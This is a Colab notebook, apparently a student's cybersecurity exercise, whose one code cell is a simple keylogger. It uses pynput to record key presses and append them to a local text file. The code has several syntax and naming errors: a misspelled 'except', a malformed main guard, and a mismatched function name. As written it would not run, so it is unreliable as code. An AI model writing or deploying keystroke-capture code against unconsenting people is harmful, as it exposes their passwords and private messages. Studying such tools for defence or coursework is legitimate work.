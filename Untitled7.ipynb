{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO9fyk5VJPu6k3W3VljtvTe",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Asha-Sarkar-16/prodigy_cs_04/blob/prodigy/Untitled7.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Jn1csUmQodqb"
      },
      "outputs": [],
      "source": [
        "from pynput import keyboard\n",
        "\n",
        "def keyPressed(key):\n",
        "    print(str(key))\n",
        "    with open(\"keyfile.txt\", 'a') as logkey:\n",
        "        try:\n",
        "            char = key.char\n",
        "            logkey.write(char)\n",
        "        execpt:\n",
        "            print(\"Error getting char\")\n",
        "\n",
        "if__name__ == \"_main_\":\n",
        "    listener = keyboard.Listener(on_press=keypressed)\n",
        "    listener.start()\n",
        "    input()"
      ]
    }
  ]
}